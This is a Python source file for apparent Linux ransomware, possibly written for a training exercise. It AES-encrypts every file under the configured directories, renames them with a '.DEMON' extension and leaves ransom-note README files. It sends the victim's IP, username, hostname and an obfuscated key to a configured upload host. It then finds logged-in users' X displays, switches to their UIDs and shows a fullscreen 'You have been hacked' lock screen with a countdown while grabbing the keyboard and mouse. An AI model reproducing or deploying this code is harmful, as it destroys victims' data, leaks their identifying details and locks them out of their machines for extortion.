# emacs this is -*-python-*-

import getpass
import subprocess
import yaml
import pwd, os, sys, socket, string, random, platform
from Crypto import Random
from Crypto.Cipher import AES
import traceback


import tkinter as tk
from tkinter import *
from tkinter.ttk import *
from ctypes import *
import pwd, os, sys, socket, string, platform, threading, time

# except Exception as e:
#  traceback.print_exc()
#  print("No GUI")

from ctypes.util import find_library

live = True


def check_and_load_library(libname):
    handle = find_library(libname)
    if handle is None:
        raise ImportError("unable to find system library: {}".format(libname))
    return cdll.LoadLibrary(handle)


class XCBError(Exception):
    """
    Raised on XCBErrors
    """


class Connection(Structure):
    pass


class Setup(Structure):
    pass


Window = c_uint32
Colormap = c_uint32
VisualID = c_uint32


class Screen(Structure):
    _fields_ = [
        ("root", Window),
        ("default_colormap", Colormap),
        ("white_pixel", c_uint32),
        ("black_pixel", c_uint32),
        ("current_input_masks", c_uint32),
        ("width_in_pixels", c_uint16),
        ("height_in_pixels", c_uint16),
        ("width_in_millimeters", c_uint16),
        ("height_in_millimeters", c_uint16),
        ("min_installed_maps", c_uint16),
        ("max_installed_maps", c_uint16),
        ("root_visual", VisualID),
        ("backing_stores", c_uint8),
        ("save_unders", c_uint8),
        ("root_depth", c_uint8),
        ("allowed_depths_len", c_uint8),
    ]


class ScreenIterator(Structure):
    _fields_ = [("data", POINTER(Screen)), ("rem", c_int), ("index", c_int)]


class GetWindowAttributesReply(Structure):
    _fields_ = [
        ("response_type", c_uint8),
        ("backing_store", c_uint8),
        ("sequence", c_uint16),
        ("length", c_uint32),
        ("visual", VisualID),
        ("_class", c_uint16),
        ("bit_gravity", c_uint8),
        ("win_gravity", c_uint8),
        ("backing_planes", c_uint32),
        ("backing_pixel", c_uint32),
        ("save_under", c_uint8),
        ("map_is_installed", c_uint8),
        ("map_state", c_uint8),
        ("override_redirect", c_uint8),
        ("colormap", Colormap),
        ("all_event_masks", c_uint32),
        ("your_event_masks", c_uint32),
        ("do_not_propagate_mask", c_uint16),
        ("pad0", c_uint8 * 2),
    ]


class Cookie(Structure):
    _fields_ = [("sequence", c_uint)]


VoidCookie = Cookie
AllocNamedColorCookie = Cookie
AllocColorCookie = Cookie
GrabKeyboardCookie = Cookie
GrabPointerCookie = Cookie


# TODO?
class ImageFormat(c_int):
    pass


class ImageOrder(c_int):
    pass


class AllocNamedColorReply(Structure):
    _fields_ = [
        ("response_type", c_uint8),
        ("pad0", c_uint8),
        ("sequence", c_uint16),
        ("length", c_uint32),
        ("pixel", c_uint32),
        ("exact_red", c_uint16),
        ("exact_green", c_uint16),
        ("exact_blue", c_uint16),
        ("visual_red", c_uint16),
        ("visual_green", c_uint16),
        ("visual_blue", c_uint16),
    ]


class AllocColorReply(Structure):
    _fields_ = [
        ("response_type", c_uint8),
        ("pad0", c_uint8),
        ("sequence", c_uint16),
        ("length", c_uint32),
        ("red", c_uint16),
        ("green", c_uint16),
        ("blue", c_uint16),
        ("pad1", c_uint8 * 2),
        ("pixel", c_uint32),
    ]


class GenericError(Structure):
    _fields_ = [
        ("response_type", c_uint8),
        ("error_code", c_uint8),
        ("sequence", c_uint16),
        ("resource_id", c_uint32),
        ("minor_code", c_uint16),
        ("major_code", c_uint8),
        ("pad0", c_uint8),
        ("pad", c_uint32 * 5),
        ("full_sequence", c_uint32),
    ]

    def __str__(self):
        return "{}({})".format(
            self.__class__.__name__,
            ",".join(
                field + "=" + str(getattr(self, field)) for field, _ in self._fields_
            ),
        )


class GenericID(c_uint32):
    pass


class GrabReply(Structure):
    _fields_ = [
        ("response_type", c_uint8),
        ("status", c_uint8),
        ("sequence", c_uint16),
        ("length", c_uint32),
    ]

    def __str__(self):
        return "{}({})".format(
            self.__class__.__name__,
            ",".join(str(getattr(self, field)) for field, _ in self._fields_),
        )


class GenericEvent(Structure):
    _fields_ = [
        ("response_type", c_uint8),
        ("pad0", c_uint8),
        ("sequence", c_uint16),
        ("pad", c_uint32 * 7),
        ("full_sequence", c_uint32),
    ]


Keycode = c_uint8
Timestamp = c_uint32


class KeyPressEvent(Structure):
    _fields_ = [
        ("response_type", c_uint8),
        ("detail", Keycode),
        ("sequence", c_uint16),
        ("time", Timestamp),
        ("root", Window),
        ("event", Window),
        ("child", Window),
        ("root_x", c_int16),
        ("root_y", c_int16),
        ("event_x", c_int16),
        ("event_y", c_int16),
        ("state", c_uint16),
        ("same_screen", c_uint8),
        ("pad0", c_uint8),
    ]


GrabKeyboardReply = GrabReply
GrabPointerReply = GrabReply


Pixmap = GenericID
Cursor = GenericID

COPY_FROM_PARENT = 0
WINDOW_CLASS_INPUT_ONLY = 2
CW_OVERRIDE_REDIRECT = 512
CW_EVENT_MASK = 2048

EVENT_MASK_KEY_PRESS = 1
EVENT_MASK_KEY_RELEASE = 2

CURRENT_TIME = 0
GRAB_MODE_ASYNC = 1

WINDOW_NONE = 0

KEY_PRESS = 2

libxcb = check_and_load_library("xcb")
libxcb_image = check_and_load_library("xcb-image")
libc = check_and_load_library("c")

connect = libxcb.xcb_connect
connect.argtypes = [c_char_p, POINTER(c_int)]
connect.restype = POINTER(Connection)

get_setup = libxcb.xcb_get_setup
get_setup.argtypes = [POINTER(Connection)]
get_setup.restype = POINTER(Setup)

setup_roots_iterator = libxcb.xcb_setup_roots_iterator
setup_roots_iterator.argtypes = [POINTER(Setup)]
setup_roots_iterator.restype = ScreenIterator

screen_next = libxcb.xcb_screen_next
screen_next.argtypes = [POINTER(ScreenIterator)]
screen_next.restype = None

generate_id = libxcb.xcb_generate_id
generate_id.argtypes = [POINTER(Connection)]
generate_id.restype = GenericID

create_window = libxcb.xcb_create_window
create_window.argtypes = [
    POINTER(Connection),  # connection
    c_uint8,  # depth
    Window,  # wid
    Window,  # parent
    c_int16,  # x
    c_int16,  # y
    c_uint16,  # width
    c_uint16,  # height
    c_uint16,  # border_width
    c_uint16,  # _class
    VisualID,  # visual
    c_uint32,  # value_mask
    POINTER(c_uint32),  # value_lis
]
create_window.restype = VoidCookie

alloc_named_color = libxcb.xcb_alloc_named_color
alloc_named_color.argtypes = [
    POINTER(Connection),  # connection
    Colormap,  # cmap
    c_uint16,  # name len
    c_char_p,  # name
]
alloc_named_color.restype = AllocNamedColorCookie

alloc_color = libxcb.xcb_alloc_color
alloc_color.argtypes = [
    POINTER(Connection),  # connection
    Colormap,  # cmap
    c_uint16,  # r
    c_uint16,  # g
    c_uint16,  # b
]
alloc_color.restype = AllocColorCookie

alloc_named_color_reply = libxcb.xcb_alloc_named_color_reply
alloc_named_color_reply.argtypes = [
    POINTER(Connection),  # connection
    AllocNamedColorCookie,  # cookie
    POINTER(POINTER(GenericError)),  # e
]
alloc_named_color_reply.restype = POINTER(AllocNamedColorReply)

alloc_color_reply = libxcb.xcb_alloc_color_reply
alloc_color_reply.argtypes = [
    POINTER(Connection),  # connection
    AllocColorCookie,  # cookie
    POINTER(POINTER(GenericError)),  # e
]
alloc_color_reply.restype = POINTER(AllocColorReply)


def alloc_named_color_sync(conn, colormap, color_string):
    """Synchronously allocate a named color

    Wrapper function for xcb_alloc_named_color and alloc_named_color_reply.

    Raises ``XCBError`` on errors.
    """
    if isinstance(color_string, str):
        color_string = color_string.encode("us-ascii")

    cookie = alloc_named_color(conn, colormap, len(color_string), color_string)
    error_p = POINTER(GenericError)()
    res = alloc_named_color_reply(conn, cookie, byref(error_p))
    if error_p:
        raise XCBError(error_p.contents)

    ret = (res.contents.visual_red, res.contents.visual_green, res.contents.visual_blue)
    free(res)
    return ret


def alloc_color_sync(conn, colormap, r, g, b):
    """Synchronously allocate a color

    Wrapper function for xcb_alloc_color and alloc_color_reply.

    The (r, g, b) triple is in the range 0 to 255 (as opposed to
    the X protocol using the 0 to 2^16-1 range).

    Raises ``XCBError`` on xcb errors and value errors for invalid
    values of r, g, b.
    """
    if r < 0 or b < 0 or g < 0:
        raise ValueError
    if r > 255 or b > 255 or g > 255:
        raise ValueError

    r <<= 8
    g <<= 8
    b <<= 8

    cookie = alloc_color(conn, colormap, r, g, b)
    error_p = POINTER(GenericError)()
    res = alloc_color_reply(conn, cookie, byref(error_p))
    if error_p:
        raise XCBERror(error_p.contents)

    ret = (res.contents.red, res.contents.blue, res.contents.green)
    free(res)
    return ret


request_check = libxcb.xcb_request_check
request_check.argtypes = [POINTER(Connection), VoidCookie]
request_check.restype = POINTER(GenericError)

create_cursor_checked = libxcb.xcb_create_cursor_checked
create_cursor_checked.argtypes = [
    POINTER(Connection),  # connection
    Cursor,  # cursor
    Pixmap,  # source
    Pixmap,  # mask
    c_uint16,  # fore_red
    c_uint16,  # fore_green
    c_uint16,  # fore_blue
    c_uint16,  # back_red
    c_uint16,  # back_green
    c_uint16,  # back_blue
    c_uint16,  # x
    c_uint16,  # y
]
create_cursor_checked.restype = VoidCookie


def create_cursor_sync(conn, source, mask, fg, bg, x, y):
    """
    Synchronously create a cursor, including error checks.

    Raises ``XCBError`` on failure. Otherwise returns ``Cursor``.
    """
    cursor = generate_id(conn)
    cookie = create_cursor_checked(
        conn, cursor, source, mask, fg[0], fg[1], fg[2], bg[0], bg[1], bg[2], x, y
    )
    error = request_check(conn, cookie)
    if error:
        raise XCBError(error.contents)

    return cursor


map_window = libxcb.xcb_map_window
map_window.argtypes = [POINTER(Connection), Window]
map_window.restype = VoidCookie

flush = libxcb.xcb_flush
flush.argtypes = [POINTER(Connection)]
flush.restype = c_int

grab_keyboard = libxcb.xcb_grab_keyboard
grab_keyboard.argtypes = [
    POINTER(Connection),  # connection
    c_uint8,  # owner_events
    Window,  # grab_window
    Timestamp,  # time
    c_uint8,  # pointer_mode
    c_uint8,  # keyboard_mode
]
grab_keyboard.restype = GrabKeyboardCookie

grab_keyboard_reply = libxcb.xcb_grab_keyboard_reply
grab_keyboard_reply.argtypes = [
    POINTER(Connection),  # connection
    GrabKeyboardCookie,  # cookie,
    POINTER(POINTER(GenericError)),  # e
]
grab_keyboard_reply.restype = POINTER(GrabKeyboardReply)


def grab_keyboard_sync(conn, owner_events, grab_window, time, ptr_mode, kbd_mode):
    """
    Synchronously grab the keyboard.

    Wrapper function for grab_pointer and grab_pointer_reply. Returns
    the status field from the reply. Raises ``XCBError`` on error.
    """
    owner_events = 1 if owner_events else 0

    cookie = grab_keyboard(conn, owner_events, grab_window, time, ptr_mode, kbd_mode)
    error_p = POINTER(GenericError)()
    kbd_grab = grab_keyboard_reply(conn, cookie, byref(error_p))

    if error_p:
        raise XCBError(error_p.contents)
    status = kbd_grab.contents.status
    free(kbd_grab)
    return status


grab_pointer = libxcb.xcb_grab_pointer
grab_pointer.argtypes = [
    POINTER(Connection),  # connection
    c_uint8,  # owner_events
    Window,  # grab_window
    c_uint16,  # event_mask
    c_uint8,  # pointer_mode
    c_uint8,  # keyboard_mode
    Window,  # confine_to
    Cursor,  # cursor
    Timestamp,  # time
]
grab_pointer.restype = GrabPointerCookie

grab_pointer_reply = libxcb.xcb_grab_pointer_reply
grab_pointer_reply.argtypes = [
    POINTER(Connection),  # connection
    GrabPointerCookie,  # cookie,
    POINTER(POINTER(GenericError)),  # e
]
grab_pointer_reply.restype = POINTER(GrabPointerReply)

# constants to interpret grab results
GrabSuccess = 0
AlreadyGrabbed = 1
GrabInvalidTime = 2
GrabNotViewable = 3
GrabFrozen = 4


def grab_pointer_sync(
    conn,
    owner_events,
    window,
    event_mask,
    ptr_mode,
    kbd_mode,
    confine_to,
    cursor,
    timestamp,
):
    """
    Synchronously grab the pointing device.

    Wrapper function for ``grab_pointer`` and ``grab_pointer_reply``.
    Raises ``XCBError`` on error. Otherwise returns the result of
    ``grab_pointer_reply``
    """
    owner_events = 1 if owner_events else 0
    cookie = grab_pointer(
        conn,
        owner_events,
        window,
        event_mask,
        ptr_mode,
        kbd_mode,
        confine_to,
        cursor,
        timestamp,
    )
    error_p = POINTER(GenericError)()
    ptr_grab = grab_pointer_reply(conn, cookie, byref(error_p))
    if error_p:
        raise XCBError(error_p.contents)
    status = ptr_grab.contents.status
    free(ptr_grab)
    return status


wait_for_event_ = libxcb.xcb_wait_for_event
wait_for_event_.argtypes = [POINTER(Connection)]
wait_for_event_.restype = POINTER(GenericEvent)

free = libc.free
free.argtypes = [c_void_p]
free.restype = None


class FreeWrapper(object):
    def __init__(self, pointer):
        self.pointer = pointer

    def __enter__(self):
        return self.pointer

    def __exit__(self, etype, evalue, traceback):
        free(self.pointer)


def wait_for_event(conn):
    return FreeWrapper(wait_for_event_(conn))


# xcb_image
image_create_pixmap_from_bitmap_data = libxcb_image.xcb_create_pixmap_from_bitmap_data
image_create_pixmap_from_bitmap_data.restype = Pixmap
image_create_pixmap_from_bitmap_data.argtypes = [
    POINTER(Connection),  # connection
    Window,  # drawable
    c_char_p,  # data
    c_uint32,  # width
    c_uint32,  # height
    c_uint32,  # depth
    c_uint32,  # fg
    c_uint32,  # bg
    POINTER(c_uint8),  # XXX graphics context
]


# Invisible mouse pointer
EMPTY_CURSOR = {
    "width": 1,
    "height": 1,
    "x_hot": 1,
    "y_hot": 1,
    "fg_bitmap": bytes([0x00]),
    "bg_bitmap": bytes([0x00]),
    "color_mode": "named",
    "bg_color": "steelblue3",
    "fg_color": "grey25",
}

UNCHANGED_CURSOR = None

XDG_CONFIG_HOME = os.environ.get("XDG_CONFIG_HOME") or os.path.expanduser("~/.config")


def panic(message, exit_code=1):
    """Print an error message to stderr and exit"""
    print(message, file=sys.stderr)
    sys.exit(exit_code)


libx_xcb = check_and_load_library("X11-xcb")
libx = check_and_load_library("X11")


class Display(Structure):
    pass


Time = c_ulong
Bool = c_int
Window = c_ulong


class KeyEvent(Structure):
    _fields_ = [
        ("type", c_int),
        ("serial", c_ulong),
        ("send_event", Bool),
        ("display", POINTER(Display)),
        ("window", Window),
        ("root", Window),
        ("subwindow", Window),
        ("time", Time),
        ("x", c_int),
        ("y", c_int),
        ("x_root", c_int),
        ("y_root", c_int),
        ("state", c_uint),
        ("keycode", c_uint),
        ("same_screen", Bool),
    ]

    @classmethod
    def from_xcb_event(cls, display, xcb_key_press_event):
        x_key_press_event = cls()
        x_key_press_event.type = xcb_key_press_event.response_type
        x_key_press_event.serial = xcb_key_press_event.sequence
        x_key_press_event.send_event = 0
        x_key_press_event.display = display
        x_key_press_event.window = xcb_key_press_event.event
        x_key_press_event.root = xcb_key_press_event.root
        x_key_press_event.subwindow = xcb_key_press_event.child
        x_key_press_event.time = xcb_key_press_event.time
        x_key_press_event.x = xcb_key_press_event.event_x
        x_key_press_event.y = xcb_key_press_event.event_y
        x_key_press_event.y_root = xcb_key_press_event.root_y
        x_key_press_event.state = xcb_key_press_event.state
        x_key_press_event.same_screen = xcb_key_press_event.same_screen
        x_key_press_event.keycode = xcb_key_press_event.detail

        return x_key_press_event


Keysym = c_ulong
Status = c_int


# XXX evil :)
# Should really use opaque structs for type safety
IM = POINTER(c_uint32)
IC = POINTER(c_uint32)

create_window_x = libx.XOpenDisplay
create_window_x.argtypes = [c_char_p]
create_window_x.restype = POINTER(Display)

close_window = libx.XCloseDisplay
close_window.argtypes = [POINTER(Display)]
close_window.restype = c_int

get_xcb_connection = libx_xcb.XGetXCBConnection
get_xcb_connection.argtypes = [POINTER(Display)]
get_xcb_connection.restype = POINTER(Connection)

open_IM = libx.XOpenIM
open_IM.argtypes = [POINTER(Display), c_void_p, c_void_p, c_void_p]  # display
open_IM.restype = IM

create_IC = libx.XCreateIC
create_IC.argtypes = [IM, c_char_p, c_uint32, c_void_p]  # input method  # inputStyle
create_IC.restype = IC

N_INPUT_STYLE = b"inputStyle"
IM_PRE_EDIT_NOTHING = 0x0008
IM_STATUS_NOTHING = 0x0400

set_ic_focus = libx.XSetICFocus
set_ic_focus.argtypes = [IC]
set_ic_focus.restype = None

utf8_lookup_string = libx.Xutf8LookupString
utf8_lookup_string.argtypes = [
    IC,
    POINTER(KeyEvent),
    POINTER(c_char),
    c_int,  # len
    POINTER(Keysym),
    POINTER(Status),
]
utf8_lookup_string.restype = c_int

BUFFER_OVERFLOW = -1
LOOKUP_NONE = 1
LOOKUP_CHARS = 2
LOOKUP_KEYSYM = 3
LOOKUP_BOTH = 4

K_Escape = 0xFF1B
K_Clear = 0xFF0B
K_Delete = 0xFFFF
K_BackSpace = 0xFF08
K_LineFeed = 0xFF0A
K_Return = 0xFF0D


class App(tk.Tk):
    def __init__(self, master=None):
        super().__init__(master)
        self.title(string="Tango Down!")  # Set window title
        # self.resizable(0,0) # Do not allow to be resized
        self.config(background="black")


class mainwindow(tk.Canvas):
    def __init__(self, app, config):
        super().__init__(app, width=1600, height=1200)
        self.config(background="black")
        # self.title(string = "Tango Down!") # Set window title
        # self.resizable(0,0) # Do not allow to be resized
        # self.overrideredirect(True)

        self.style = Style()
        self.style.theme_use("clam")

        photo = PhotoImage(data=config["image_b64"])
        photo = photo.subsample(4)

        label = Label(self, image=photo, background="black")
        label.image = photo  # keep a reference!
        label.grid(row=5, column=0, rowspan=2, pady=(30, 200))
        label = Label(self, image=photo, background="black")
        label.image = photo  # keep a reference!
        label.grid(row=5, column=3, rowspan=2, pady=(30, 200))

        Label(
            self,
            text=config["message"],
            font="Helvetica 16 bold",
            foreground="white",
            background="red",
        ).grid(row=0, column=0, columnspan=4, pady=200)

        Label(
            self,
            text="",
            font="Helvetica 18 bold",
            foreground="red",
            background="black",
        ).grid(row=5, column=2)
        Label(
            self,
            text="",
            font="Helvetica 18 bold",
            foreground="red",
            background="black",
        ).grid(row=6, column=2)
        self.pack()

        def start_thread():
            # Start timer as thread
            thread = threading.Thread(target=start_timer)
            thread.daemon = True
            thread.start()

        def start_timer():
            Label(
                self,
                text="TIME LEFT:",
                font="Helvetica 18 bold",
                foreground="red",
                background="black",
            ).grid(row=5, column=0, columnspan=4, pady=(30, 200))
            try:
                s = 22800  # 380 Minuten (VS38 => 380 ;-)
                while s:
                    min, sec = divmod(s, 60)
                    time_left = "{:02d}:{:02d}".format(min, sec)

                    Label(
                        self,
                        text=time_left,
                        font="Helvetica 18 bold",
                        foreground="red",
                        background="black",
                    ).grid(row=6, column=0, columnspan=4, pady=(0, 200))
                    time.sleep(1)
                    s -= 1
            except KeyboardInterrupt:
                print("Closed...")

        if os == "Windows":
            pass
        else:
            start_thread()


# create cursor from bitmap from original simplelocker
def create_cursor(conn, window, screen, cursor):
    csr_map = image_create_pixmap_from_bitmap_data(
        conn,
        window,
        cursor["fg_bitmap"],
        cursor["width"],
        cursor["height"],
        1,
        0,
        0,
        None,
    )
    csr_mask = image_create_pixmap_from_bitmap_data(
        conn,
        window,
        cursor["bg_bitmap"],
        cursor["width"],
        cursor["height"],
        1,
        0,
        0,
        None,
    )

    if cursor["color_mode"] == "named":
        csr_bg = alloc_named_color_sync(
            conn, screen.default_colormap, cursor["bg_color"]
        )
        csr_fg = alloc_named_color_sync(
            conn, screen.default_colormap, cursor["fg_color"]
        )
    elif cursor["color_mode"] == "rgb":
        r, g, b = cursor["bg_color"]
        csr_bg = alloc_color_sync(conn, screen.default_colormap, r, g, b)
        r, g, b = cursor["fg_color"]
        csr_fg = alloc_color_sync(conn, screen.default_colormap, r, g, b)
    else:
        panic("Invalid color mode")

    try:
        return create_cursor_sync(
            conn, csr_map, csr_mask, csr_fg, csr_bg, cursor["x_hot"], cursor["y_hot"]
        )
    except XCBError:
        panic("pyxtrlock: Could not create cursor")


def lock_screen(myapp, hide_cursor: bool):
    display = create_window_x(None)
    conn = get_xcb_connection(display)

    if not display:
        panic("pyxtrlock: Could not connect to X server")

    screen_num = c_int()

    setup = get_setup(conn)

    iter_ = setup_roots_iterator(setup)

    while screen_num.value:
        screen_next(byref(iter_))
        screen_num.value -= 1

    screen = iter_.data.contents

    # create window
    window = generate_id(conn)

    attribs = (c_uint32 * 2)(1, EVENT_MASK_KEY_PRESS)
    create_window(
        conn,
        COPY_FROM_PARENT,
        window,
        screen.root,
        0,
        0,
        1,
        1,
        0,
        WINDOW_CLASS_INPUT_ONLY,
        VisualID(COPY_FROM_PARENT),
        CW_OVERRIDE_REDIRECT | CW_EVENT_MASK,
        cast(byref(attribs), POINTER(c_uint32)),
    )

    if hide_cursor:
        cursor = create_cursor(conn, window, screen, EMPTY_CURSOR)
    else:
        cursor = 0  # keep mouse pointer as it is

    # map window
    map_window(conn, window)

    # Grab keyboard
    try:
        status = grab_keyboard_sync(
            conn, 0, window, CURRENT_TIME, GRAB_MODE_ASYNC, GRAB_MODE_ASYNC
        )

        if status != GrabSuccess:
            panic("pyxtrlock: Could not grab keyboard")
    except XCBError as err:
        panic("pyxtrlock: Could not grab keyboard " + str(err))

    # Grab pointer
    # Use the method from the original xtrlock code:
    #  "Sometimes the WM doesn't ungrab the keyboard quickly enough if
    #  launching xtrlock from a keystroke shortcut, meaning xtrlock fails
    #  to start We deal with this by waiting (up to 100 times) for 10,000
    #  microsecs and trying to grab each time. If we still fail
    #  (i.e. after 1s in total), then give up, and emit an error"
    for _ in range(100):
        try:
            status = grab_pointer_sync(
                conn,
                False,
                window,
                0,
                GRAB_MODE_ASYNC,
                GRAB_MODE_ASYNC,
                WINDOW_NONE,
                cursor,
                CURRENT_TIME,
            )

            if status == GrabSuccess:
                break
            else:
                time.sleep(0.01)
        except XCBError:
            time.sleep(0.01)
    else:
        panic("pyxtrlock: Could not grab pointing device")

    flush(conn)

    # Prepare X Input
    im = open_IM(display, None, None, None)
    if not im:
        panic("pyxtrlock: Could not open Input Method")

    ic = create_IC(im, N_INPUT_STYLE, IM_PRE_EDIT_NOTHING | IM_STATUS_NOTHING, None)
    if not ic:
        panic("pyxtrlock: Could not open Input Context")

    set_ic_focus(ic)


def get_config():
    bundle_dir = getattr(sys, "_MEIPASS", os.path.abspath(os.path.dirname(__file__)))
    data_path = os.path.abspath(os.path.join(bundle_dir, "data.yml"))

    with open(data_path, "r") as stream:
        try:
            config = yaml.safe_load(stream)
        except yaml.YAMLError as exc:
            print(exc)
            config = {
                "keyupload_host": "127.0.0.1",
                "keyupload_port": "80",
                "target_dirs": ["/var/lib/grafana"],
                "message": "You have been hacked",
            }
    return config


global CONFIG
CONFIG = get_config()


def panic(message, exit_code=1):
    """Print an error message to stderr and exit"""
    print(message, file=sys.stderr)
    sys.exit(exit_code)


def start_gui(display):
    os.environ["DISPLAY"] = display
    # GUI: creates the tkinter application and canvas
    app = App()
    myapp = mainwindow(app, CONFIG)

    # makes fullscreen
    step = app.attributes("-fullscreen", True)

    # first update
    myapp.update_idletasks()
    myapp.update()

    print("starting lockscreen")
    lock_screen(myapp, True)
    myapp.mainloop()


def getlocalip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


def gen_string(size=64, chars=string.ascii_uppercase + string.digits):
    return "".join(random.choice(chars) for _ in range(size))


# Encryption
def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)


def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)


def encrypt_file(file_name, key):
    with open(file_name, "rb") as fo:
        plaintext = fo.read()
    enc = encrypt(plaintext, key)

    with open(file_name, "wb") as fo:
        fo.write(enc)
    os.rename(file_name, file_name + ".DEMON")


# key = hashlib.md5(gen_string().encode('utf-8')).hexdigest()
rkey = "1d5e201b65f06a9a5799cc2aefe77137"
rkey = rkey.encode("utf-8")

global os_platform
global name
os_platform = platform.system()
hostname = platform.node()


def get_target():
    # TARGET IS ALLWAYS ROOT
    return "/"


def start_encrypt(p, key):
    c = 0

    dirs = CONFIG["target_dirs"]
    exclude_ext = [".DEMON"]

    try:
        for x in dirs:
            target = p + x + "/"

            for path, subdirs, files in os.walk(target):
                for name in files:
                    for i in exclude_ext:
                        if not name.lower().endswith(i.lower()):
                            try:
                                if live:
                                    encrypt_file(os.path.join(path, name), key)
                                c += 1
                            except:
                                pass

                try:
                    with open(path + "/README.txt", "w") as f:
                        f.write(CONFIG["message"])
                        f.close()
                except Exception as e:
                    pass

    except Exception as e:
        pass  # continue if error


# this is caesar encoding
def get_uid(uid, index):
    uid = uid.decode()
    return "".join(
        [
            string.ascii_lowercase[:26][
                (string.ascii_lowercase[:26].find(c) + index) % 26
            ]
            if c.isalpha()
            else c
            for c in uid
        ]
    ).encode("utf-8")


def connector():
    server = socket.socket(socket.AF_INET)
    server.settimeout(10)

    try:
        # Send Key
        server.connect((CONFIG["keyupload_host"], CONFIG["keyupload_port"]))
        msg = "%s$%s$%s$%s$%s" % (
            getlocalip(),
            os_platform,
            get_uid(rkey, 10),
            getpass.getuser(),
            hostname,
        )
        server.send(msg.encode("utf-8"))

    finally:
        start_encrypt(get_target(), get_uid(get_uid(rkey, 10), 13))


def main():
    try:
        connector()
    except KeyboardInterrupt:
        sys.exit(0)

    # dirty code this might not work on all linux systems
    # users = os.popen("/usr/bin/who -s | /usr/bin/awk -F'[[:space:]]*' '$4~/^\(:[0-9]\)$/ {gsub(/\(/,\"\",$4);gsub(/\)/,\"\",$4); print $1\",\"$4}").read()
    users = [
        l[0].decode()
        for l in [
            l.split() for l in subprocess.check_output("/usr/bin/who").splitlines()
        ]
    ]

    for user in users:
        try:
            display = subprocess.check_output(
                "/usr/bin/ps -u $(id -u {}) -o pid= | /usr/bin/xargs -I{{}} /usr/bin/cat /proc/{{}}/environ 2>/dev/null | /usr/bin/tr '\\0' '\\n' | /usr/bin/grep -m1 '^DISPLAY='".format(
                    user
                ),
                shell=True,
            )
        except subprocess.CalledProcessError:
            print("Could not find display - are u root?")
            continue
        display = display.decode().split("=")[1].rstrip("\n")
        uid = pwd.getpwnam(user).pw_uid
        if os.getuid() != uid:  # check if user is already executing
            if os.getuid() == 0:  # check if we are root
                os.setuid(uid)
            # this currently works only for one user at a time, implement it with /usr/bin/su or something if you have the time
        start_gui(display)  # try to start gui


if __name__ == "__main__":
    main()
